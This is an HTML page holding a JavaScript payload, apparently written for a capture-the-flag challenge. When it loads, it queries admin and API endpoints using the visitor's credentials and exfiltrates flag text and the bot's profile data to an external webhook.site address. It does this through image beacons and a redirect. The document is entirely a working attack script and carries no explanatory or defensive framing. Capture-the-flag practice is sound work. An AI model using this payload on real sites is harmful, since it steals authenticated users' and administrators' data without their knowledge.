<!DOCTYPE html>
<html>
<body>
    <script>
        const webh = "https://webhook.site/eea9d67e-7379-46ca-b85a-c69dad2bf391";
        
        async function bruteForcePaths() {
            // These are the most likely paths for Flag 5 based on common Hash Academy patterns
            const targets = [
                "/admin/dashboard",
                "/admin/messages/all",
                "/admin/settings",
                "/api/admin/flag",
                "/api/admin/stats"
            ];

            for (let path of targets) {
                try {
                    const r = await fetch(path, { credentials: 'include' });
                    const text = await r.text();
                    
                    // If the response contains "HASH{", we win. 
                    // Send it immediately.
                    if (text.includes("HASH{")) {
                        new Image().src = `${webh}/winner?p=${path}&data=${btoa(text.substring(text.indexOf("HASH{"), text.indexOf("HASH{") + 50))}`;
                    } else {
                        // Otherwise, just log that we checked it
                        new Image().src = `${webh}/check?path=${btoa(path)}&status=${r.status}`;
                    }
                } catch(e) {}
            }

            // Fallback: Leak the Bot's own internal profile JSON
            fetch('/api/auth/profile').then(r => r.text()).then(d => {
                location.href = webh + "?bot_profile=" + btoa(d);
            });
        }

        bruteForcePaths();
    </script>
</body>
</html>
